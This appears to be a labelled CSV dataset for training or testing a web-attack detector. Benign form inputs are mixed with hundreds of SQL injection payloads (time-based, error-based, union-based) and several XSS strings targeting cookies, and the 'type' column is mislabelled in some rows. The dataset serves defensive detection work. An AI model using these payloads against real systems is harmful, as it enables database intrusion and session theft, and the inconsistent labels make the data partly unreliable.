Text,attack_type,Label,type
"1%'));iif(5519=4796,1,1/0)",sqli,1,sql
"1')) as eleh where 1347=1347 or 8421=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
1886,norm,0,normal
4797639945557963,norm,0,normal
1')));select case when 2948=7279 then 1 else null end--,sqli,1,sql
"calle la caldera, 76 11-c",norm,0,normal
ga7bn,norm,0,normal
1) where 6725=6725 and 1553=7419,sqli,1,normal
"1' or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)",sqli,1,sql
1')));select case when 3819=1887 then 1 else null end--,sqli,1,sql
"1"") and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""hsaw""=""hsaw",sqli,1,normal
gumersindo,norm,0,normal
"1') where 7640=7640 and make_set(8978=8594,8594)--",sqli,1,sql
21905566k,norm,0,normal
1);select sleep(5),sqli,1,sql
"-3827"") or 8571=8571--",sqli,1,sql
1'||(select 'oxdh' where 6967=6967 and sleep(5)#,sqli,1,sql
-1854') as fmmq where 7326=7326 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,sqli,1,sql
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('vfxg' like 'vfxg",sqli,1,sql
adoro,norm,0,normal
comport8ble,norm,0,normal
4073783110590723,norm,0,normal
painter.stovin@tetdevelocidad.bn,norm,0,normal
"-8106%"") union all select 2051,2051,2051,2051,2051,2051#",sqli,1,sql
04897,norm,0,normal
2243286657629383,norm,0,normal
choon-li,norm,0,normal
"1"")) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((""gmld"" like ""gmld",sqli,1,sql
gualta,norm,0,normal
malave dehesa,norm,0,normal
85744372g,norm,0,normal
"c/ errementariena 31,",norm,0,normal
19245,norm,0,normal
"1;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual",sqli,1,sql
"1))) union all select null,null#",sqli,1,sql
"c/ santisimo cristo del amor, 186,",norm,0,normal
zauhar,norm,0,normal
2742,norm,0,normal
"1"") or 6793=(select 6793 from pg_sleep(5)) and (""baia""=""baia",sqli,1,sql
73672811q,norm,0,normal
"1"") and (3020=3020)*6703 and (""hkjf""=""hkjf",sqli,1,normal
archie,norm,0,normal
"-9451%"") union all select 9963,9963,9963--",sqli,1,sql
30555153k,norm,0,normal
"-6667%"")) union all select 7348,7348,7348,7348,7348,7348,7348,7348#",sqli,1,sql
1'));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
bangert,norm,0,normal
81023504r,norm,0,normal
973,norm,0,normal
"1%')) and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
bentez monill,norm,0,normal
"1%')) union all select null,null,null,null,null,null,null--",sqli,1,sql
1%') and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('%'=',sqli,1,sql
organizar,norm,0,normal
vil francino,norm,0,normal
8166,norm,0,normal
meza@hosterialasmajadillas.gw,norm,0,normal
royo mascarell,norm,0,normal
"1' or elt(6272=6272,sleep(5)) and 'vrim'='vrim",sqli,1,normal
burbidge@elalamorestaurante.pr,norm,0,normal
17800,norm,0,normal
tei,norm,0,normal
falerno,norm,0,normal
"font d'en canyelles 21, 1-b",norm,0,normal
"-5744) union all select 3617,3617,3617,3617,3617,3617--",sqli,1,sql
barrio de mu,norm,0,normal
"1'+(select 'qaar' where 7841=7841 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))+'",sqli,1,sql
anteda,norm,0,normal
"1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'cdgm' like 'cdgm",sqli,1,sql
chasse,norm,0,normal
sandford@directoriogratuito.yu,norm,0,normal
gabarri,norm,0,normal
mareah,norm,0,normal
porfidio,norm,0,normal
1)) as gxvp where 3865=3865;select (case when (8716=1338) then 1 else 8716*(select 8716 from master..sysdatabases) end)--,sqli,1,sql
32252,norm,0,normal
r3ic5,norm,0,normal
3674,norm,0,normal
vilagine vilamitj,norm,0,normal
co8mov8mi886o,norm,0,normal
-4191) order by 1#,sqli,1,normal
7379824468809426,norm,0,normal
28820,norm,0,normal
oti sineiro,norm,0,normal
2304,norm,0,normal
-3499'))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('nzap' like 'nzap,sqli,1,sql
"c/ pablo iglesias, 116",norm,0,normal
6180,norm,0,normal
1') as pxcd where 9754=9754 or sleep(5)--,sqli,1,sql
1')) as iuta where 1482=1482;waitfor delay '0:0:5'--,sqli,1,sql
-4873'))) or 3038=3038,sqli,1,normal
fredriks,norm,0,normal
mesnadero,norm,0,normal
30097796l,norm,0,normal
igzquiza,norm,0,normal
arsene,norm,0,normal
"-5417 or elt(1032=1032,3623)",sqli,1,normal
77714009e,norm,0,normal
"1)) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((5524=5524",sqli,1,sql
oliverio,norm,0,normal
"1%' union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
"1;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4-- sapi",sqli,1,sql
"1') as myxr where 6299=6299 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
50692,norm,0,normal
villanueva del rosario,norm,0,normal
"1"") where 3084=3084 union all select null,null--",sqli,1,sql
1') as epgz where 2898=2898 and 7028=2287#,sqli,1,normal
exagerante,norm,0,normal
-9509') where 9303=9303 order by 1#,sqli,1,normal
disney,norm,0,normal
nahir,norm,0,normal
"1'));select count(*) from generate_series(1,5000000)--",sqli,1,sql
8704154782235200,norm,0,normal
galindo beneyto,norm,0,normal
buffet@aou.com.tn,norm,0,normal
lapaza o'neil,norm,0,normal
"1') as uvxl where 6211=6211 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",sqli,1,sql
sykes,norm,0,normal
"-9978"" or make_set(4893=9765,9765) and ""mhjt""=""mhjt",sqli,1,normal
"calle los tipografos, 98, 4g",norm,0,normal
ferne,norm,0,normal
"1%"") or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (""%""=""",sqli,1,sql
ostyn.martan@icodea.lu,norm,0,normal
bergere@canovash.bb,norm,0,normal
"1' in boolean mode) union all select null,null,null,null,null,null,null#",sqli,1,sql
caaveruelas,norm,0,normal
<style>@import'http://vulnerability-lab.com/crosssitescripting.css';</style>,xss,2,sql
ivancevi,norm,0,normal
gwennie,norm,0,normal
sonni,norm,0,normal
"1) as nkjo where 8462=8462 union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
72684781c,norm,0,normal
soslaya,norm,0,normal
29639,norm,0,normal
"1') union all select null,null,null,null#",sqli,1,sql
"-2216"") where 6692=6692 union all select 6692,6692,6692#",sqli,1,sql
victoir,norm,0,normal
"1""));select benchmark(5000000,md5(0x4c4d6142)) and ((""uhvy""=""uhvy",sqli,1,sql
"1')));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((('vcgc' like 'vcgc",sqli,1,sql
moscoso danot,norm,0,normal
"1) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",sqli,1,sql
botosso@mytanga.cf,norm,0,normal
"1%'))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
">""<script <b>document.cookie=true;</script>",xss,2,xss
15751165y,norm,0,normal
"1) where 1443=1443 union all select null,null,null,null,null#",sqli,1,sql
2528,norm,0,normal
516?t2r8ro,norm,0,normal
trimble.scelzo@todomodelos.al,norm,0,normal
-9660)) or 9762=9698,sqli,1,normal
masegosa,norm,0,normal
00nd11e0,norm,0,normal
0433193970984111,norm,0,normal
geir,norm,0,normal
laycock_faulds@peaf.sd,norm,0,normal
"1') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('xdce'='xdce",sqli,1,normal
-7230') or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('khtc'='khtc,sqli,1,sql
fraga guevara,norm,0,normal
mio odena,norm,0,normal
17744,norm,0,normal
-2604)) as sekb where 6897=6897 or 1000=7683,sqli,1,normal
"1) where 1013=1013 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
34126,norm,0,normal
"1' in boolean mode);select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",sqli,1,sql
basileo,norm,0,normal
28817883x,norm,0,normal
gerardo,norm,0,normal
39,norm,0,normal
4244,norm,0,normal
"1) as wvpl where 9791=9791 and make_set(3491=9067,9067)--",sqli,1,sql
"1"") as kslq where 8669=8669 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
24768,norm,0,normal
plza. santa maria 96 8?f,norm,0,normal
"1%')) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
4330170884223124,norm,0,normal
6371,norm,0,normal
c/ buenos aires s/n 6?b,norm,0,normal
janti.quillan@messadivoce.tw,norm,0,normal
silena,norm,0,normal
"1'))) and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
dieciseisavo,norm,0,normal
"d' horta, s/n",norm,0,normal
"-6405' union all select 8235,8235,8235,8235,8235#",sqli,1,sql
lovejoy,norm,0,normal
"1;select * from generate_series(3341,3341,case when (3341=3072) then 1 else 0 end) limit 1--",sqli,1,sql
gwendoline,norm,0,normal
rocquemore@spainbb.um,norm,0,normal
rozin,norm,0,normal
potel ivars,norm,0,normal
"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",sqli,1,sql
sincopar,norm,0,normal
cervi fornas,norm,0,normal
"1' and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))",sqli,1,sql
4780011651843487,norm,0,normal
curley.majurec@ajuntamentbarcelona2-0.gi,norm,0,normal
cantbrico,norm,0,normal
"1')) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('rdpv'='rdpv",sqli,1,sql
serral torrell,norm,0,normal
.h0rner3r1,norm,0,normal
"-8544%"" or 6872=6872 and ""%""=""",sqli,1,normal
"1%""))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
"1' where 8803=8803 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"llobregat 130,",norm,0,normal
"1')) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (('vwtq'='vwtq",sqli,1,normal
"1"") where 7471=7471 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"1');call regexp_substring(repeat(right(char(3702),0),500000000),null) and ('ahjo'='ahjo",sqli,1,sql
06393,norm,0,normal
"-9996' or make_set(1237=7111,7111)",sqli,1,normal
49439340n,norm,0,normal
krajacic,norm,0,normal
bret3,norm,0,normal
32159249m,norm,0,normal
"1"") where 8657=8657;select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
"1' where 5547=5547;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
"1') and make_set(9961=6559,6559) and ('exde'='exde",sqli,1,normal
1 where 2239=2239 and 6969=(select 6969 from pg_sleep(5))--,sqli,1,sql
vicens,norm,0,normal
loke,norm,0,normal
kruse,norm,0,normal
"1) as auly where 4146=4146 or elt(5873=5873,sleep(5))#",sqli,1,normal
5203672961472442,norm,0,normal
shumsky.zalata5@telelujo.ci,norm,0,normal
"1%"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
-4428) or 3038=3038,sqli,1,normal
"1' where 1895=1895 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"<?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time"">",xss,2,normal
"c/ murillo, 106 5c",norm,0,normal
-9311)) or (5065=2572)*2572 and ((1199=1199,sqli,1,normal
refrigerativo,norm,0,normal
val do dubra,norm,0,normal
67718883y,norm,0,normal
1' union all select null#,sqli,1,sql
4451,norm,0,normal
"-1956"") where 1448=1448 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",sqli,1,sql
1)) order by 1#,sqli,1,normal
"1') procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ('qdhz'='qdhz",sqli,1,normal
"-6775"" union all select 7484,7484#",sqli,1,sql
"1""))) union all select null,null--",sqli,1,sql
4626,norm,0,normal
"1%"") or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
16157298m,norm,0,normal
8578,norm,0,normal
1)) as foul where 4361=4361 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,1,sql
4509,norm,0,normal
c84a12a,norm,0,normal
8otijo,norm,0,normal
"-9922')) union all select 2193,2193,2193--",sqli,1,sql
tindall-bourne@pintandomucho.cg,norm,0,normal
4879316805989333,norm,0,normal
"1"") where 6823=6823 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
pa,norm,0,normal
"-2784')) union all select 6775,6775,6775,6775,6775,6775,6775,6775,6775#",sqli,1,sql
7207771074495103,norm,0,normal
escobado,norm,0,normal
02056001p,norm,0,normal
e5670cij3,norm,0,normal
h8r66o,norm,0,normal
"playa postiguet 81,",norm,0,normal
1) as mtnw where 7293=7293 and 2603=5764--,sqli,1,sql
61605523t,norm,0,normal
bohdan,norm,0,normal
enturbiar,norm,0,normal
"calle titania 45, 5d",norm,0,normal
.11ne5o,norm,0,normal
"-5218) union all select 9677,9677#",sqli,1,sql
9428064689399075,norm,0,normal
winnipeg,norm,0,normal
neufeld,norm,0,normal
dalmaus estrada,norm,0,normal
"1"")) as tljw where 8474=8474 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--",sqli,1,sql
"1 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))-- dkwz",sqli,1,sql
navalperal de tormes,norm,0,normal
1') and 2577=7094,sqli,1,normal
"c/ fontanelles, 196,",norm,0,normal
"-6659') where 1256=1256 union all select 1256,1256--",sqli,1,sql
46415307l,norm,0,normal
"1' and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'hhbh'='hhbh",sqli,1,sql
"1%')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('%'='",sqli,1,normal
"-8677'||(select 'ihpm' from dual where 9571=9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",sqli,1,sql
"1"" or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""zcfa""=""zcfa",sqli,1,sql
1) waitfor delay '0:0:5'--,sqli,1,sql
fazenda_heigh@unanuevavisionenortodoncia.gh,norm,0,normal
stastny,norm,0,normal
9054,norm,0,normal
7059,norm,0,normal
1'||(select 'bupa' from dual where 8548=8548;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
jailyn,norm,0,normal
">""<script>alert(document.cookie)</script>@gmail.com",xss,2,xss
50100,norm,0,normal
dove3@enla.nc,norm,0,normal
"c/ mijancas, 154 3?c",norm,0,normal
"1') union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
alegrante,norm,0,normal
12510,norm,0,normal
9947210285103354,norm,0,normal
benito@mayoriasilenciosa.mu,norm,0,normal
"-8982'+(select anyd where 5358=5358 union all select 5358,5358,5358,5358,5358,5358#",sqli,1,sql
2308,norm,0,normal
baye,norm,0,normal
"1%""))) and 1594=8757",sqli,1,normal
22961726k,norm,0,normal
33693,norm,0,normal
desnaturar,norm,0,normal
"1"")) as puws where 7006=7006;select (case when (7997=1543) then 7997 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
7400285622819954,norm,0,normal
rabanera,norm,0,normal
"calle las artes, 90,",norm,0,normal
"1"")) and elt(1210=1210,sleep(5)) and ((""utlk"" like ""utlk",sqli,1,normal
chumpipe,norm,0,normal
1);select pg_sleep(5)--,sqli,1,sql
simhan,norm,0,normal
"1') where 1577=1577 union all select null,null,null,null,null,null#",sqli,1,sql
bel bautista,norm,0,normal
46815,norm,0,normal
7855531412363120,norm,0,normal
"1"" where 5552=5552 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"-5672%"" or 3825=9675--",sqli,1,sql
8741178125642533,norm,0,normal
depredador,norm,0,normal
1')));select (case when (9562=5996) then 1 else 9562*(select 9562 from master..sysdatabases) end)--,sqli,1,sql
benita,norm,0,normal
och*avero,norm,0,normal
10335,norm,0,normal
16360,norm,0,normal
1') as qcse where 4147=4147 waitfor delay '0:0:5'--,sqli,1,sql
inciertamente,norm,0,normal
ad28rsari!a,norm,0,normal
"1""));select sleep(5) and ((""twed"" like ""twed",sqli,1,sql
1';if(4947=5350) select 4947 else drop function ereg--,sqli,1,sql
25140,norm,0,normal
exigidad,norm,0,normal
"1"");select pg_sleep(5) and (""pjql"" like ""pjql",sqli,1,sql
"1%')) union all select null,null#",sqli,1,sql
1) union all select null--,sqli,1,sql
bediaga,norm,0,normal
hagon_macina@busquedadeempleo.uy,norm,0,normal
-1638' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'xkne'='xkne,sqli,1,sql
-4157') or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('rdhm'='rdhm,sqli,1,sql
escogido francesc,norm,0,normal
"1%"")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (((""%""=""",sqli,1,sql
cubillas de santa marta,norm,0,normal
1) where 1929=1929 and (select * from (select(sleep(5)))fzno)--,sqli,1,sql
serrano,norm,0,normal
"1"") as zhlf where 4119=4119 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
shuman6,norm,0,normal
mccarthy.darcy@tantomontamontatanto.jo,norm,0,normal
siete iglesias de trabancos,norm,0,normal
"-9023%""))) union all select 4490,4490,4490#",sqli,1,sql
-4562') or 3038=3038,sqli,1,normal
16537,norm,0,normal
codony,norm,0,normal
"1)));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((6051=6051",sqli,1,sql
garda,norm,0,normal
"1'||(select 'asfl' from dual where 5846=5846 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
amontona+r,norm,0,normal
"-4944%"")) or make_set(1084=1988,1988) and ((""%""=""",sqli,1,normal
8159487475137064,norm,0,normal
cjar,norm,0,normal
joya,norm,0,normal
pelayo,norm,0,normal
21710,norm,0,normal
1' where 2673=2673;select (case when (2716=8138) then 2716 else 2716*(select 2716 from mysql.db) end)#,sqli,1,sql
1' and 6969=(select 6969 from pg_sleep(5)) and 'zoin'='zoin,sqli,1,sql
"-6754') where 8388=8388 union all select 8388,8388,8388,8388,8388--",sqli,1,sql
pia rusch,norm,0,normal
lazagurra,norm,0,normal
jument3,norm,0,normal
"-1170' union all select 4663,4663,4663,4663,4663,4663,4663,4663#",sqli,1,sql
"1' and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and 'rupq'='rupq",sqli,1,normal
201,norm,0,normal
16359311d,norm,0,normal
"-7831"")) as krzi where 3798=3798 order by 1--",sqli,1,sql
-8357')) as henk where 8198=8198 or 2558=9103#,sqli,1,normal
justiniano,norm,0,normal
"-6951"" union all select 2518,2518,2518,2518,2518,2518,2518,2518--",sqli,1,sql
"1"")) as femc where 1313=1313 and 4595=4595#",sqli,1,normal
8578275476079932,norm,0,normal
69299598t,norm,0,normal
"1) and elt(7425=8842,8842) and (9194=9194",sqli,1,normal
rom.val@rpdkorea.eg,norm,0,normal
-4215) where 5782=5782 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,1,sql
1889610781907232,norm,0,normal
oficios$o,norm,0,normal
4909,norm,0,normal
1) as msat where 1267=1267;select case when 3661=9315 then 1 else null end--,sqli,1,sql
4999320970641134,norm,0,normal
pladellorens albiana,norm,0,normal
fitz,norm,0,normal
velilla de san antonio,norm,0,normal
"1%'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('%'='",sqli,1,sql
02260,norm,0,normal
606,norm,0,normal
01450,norm,0,normal
"1') where 9454=9454 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
"-1504"") as wpes where 6256=6256 union all select 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#",sqli,1,sql
fredes damas,norm,0,normal
reco+nocida,norm,0,normal
"-5726%"")) or 6872=6872 and ((""%""=""",sqli,1,normal
"<iframe src=""javascript:document.cookie=true;>",xss,2,xss
"1)) and make_set(8554=3286,3286) and ((7385=7385",sqli,1,normal
"c/ el salvador 199, 9-a",norm,0,normal
"1))) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1'+(select nxfp where 5006=5006;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)+'",sqli,1,sql
"1';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3",sqli,1,sql
madridejos,norm,0,normal
">""<div style=""width: expression(document.cookie=true);"">",xss,2,sql
ku,norm,0,normal
"<bgsound id=xss src=""javascript:alert('xss');"">",xss,2,xss
4296,norm,0,normal
ferreries,norm,0,normal
121,norm,0,normal
zambrana,norm,0,normal
seiter.segev@mataluenga.bs,norm,0,normal
vereen@campodegolf.com.sj,norm,0,normal
"c/ juan de rihuerga, 0,",norm,0,normal
1');select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
"1 where 5081=5081 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",sqli,1,sql
cal,norm,0,normal
"1%"")) or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
"prat de llobregat, el",norm,0,normal
85640413m,norm,0,normal
h2lmi0to,norm,0,normal
degeistirk@meneamex.pr,norm,0,normal
"almirante cruilles 19, 11?c",norm,0,normal
"1) where 4711=4711;select count(*) from generate_series(1,5000000)--",sqli,1,sql
9ein6e0a3,norm,0,normal
"1"" and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""qqfd"" like ""qqfd",sqli,1,sql
1' in boolean mode);begin user_lock.sleep(5); end#,sqli,1,sql
"-9347') union all select 3884,3884#",sqli,1,sql
"1'+(select 'ncny' where 5634=5634;select like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",sqli,1,sql
urgel,norm,0,normal
.espejo,norm,0,normal
despacha!do,norm,0,normal
"1'||(select 'aair' where 9234=9234 union all select null,null,null,null#",sqli,1,sql
"1')) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (('wbsz'='wbsz",sqli,1,sql
